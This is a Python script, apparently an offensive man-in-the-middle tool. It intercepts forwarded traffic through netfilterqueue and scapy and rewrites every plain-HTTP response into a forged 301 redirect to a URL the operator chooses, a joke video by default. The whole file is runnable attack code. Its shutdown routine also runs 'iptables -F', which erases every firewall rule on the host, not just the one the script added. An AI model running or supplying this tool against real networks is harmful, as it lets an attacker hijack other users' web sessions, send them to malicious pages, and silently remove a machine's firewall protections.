import argparse
import functools
import os
import re

import colorama
import netfilterqueue
from colorama import Fore, Style

from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

colorama.init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Style.RESET_ALL
BRIGHT = Style.BRIGHT


def process_packet(packet, url: str) -> None:
    """
    This function is executed whenever a packet is sniffed
    """
    # convert the netfilterqueue packet into Scapy packet
    spacket = IP(packet.get_payload())

    if spacket.haslayer(Raw) and spacket.haslayer(TCP):
        if spacket[TCP].dport == 80:
            # HTTP request
            print(f"[*] Detected HTTP Request from {spacket[IP].src} to {spacket[IP].dst}")
        elif spacket[TCP].sport == 80:
            # HTTP response
            print(f"[*] Detected HTTP Response from {spacket[IP].src} to {spacket[IP].dst}")
            try:
                load = spacket[Raw].load.decode()
            except:
                packet.accept()
                return

            load = f"HTTP/1.1 301 Moved Permanently\r\nLocation: {url}\r\n\r\n"
            print(f"{GREEN}[+] Successfully redirected {spacket[IP].dst} to url{RESET}")

            # set the new data
            spacket[Raw].load = load

            # set IP length header, checksums of IP and TCP to None
            # so Scapy will re-calculate them automatically
            spacket[IP].len = None
            spacket[IP].chksum = None
            spacket[TCP].chksum = None
            packet.set_payload(bytes(spacket))

    # accept all the packets
    packet.accept()


def set_iptables() -> None:
    """
    Sets iptables to jump all the forwarded tcp packets to NFQUEUE 0
    """
    os.system("sudo iptables -I FORWARD -p tcp -j NFQUEUE --queue-num 0")


def unset_iptables() -> None:
    os.system("sudo iptables -F")


def main(args):
    queue = netfilterqueue.NetfilterQueue()

    try:
        print("[*] Creating nfqueue")
        set_iptables()
        queue.bind(0, functools.partial(process_packet, url=args.url))
        print(f"{GREEN}[+]{RESET} Started")
        queue.run()
    except KeyboardInterrupt:
        pass
    finally:
        print(f"[*] Shutting down")
        unset_iptables()
        queue.unbind()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='HTTP redirector')
    parser.add_argument('-u', '--url', type=str, help="URL to redirect to. Default is rick roll :D",
                        default="https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    args = parser.parse_args()

    main(args)
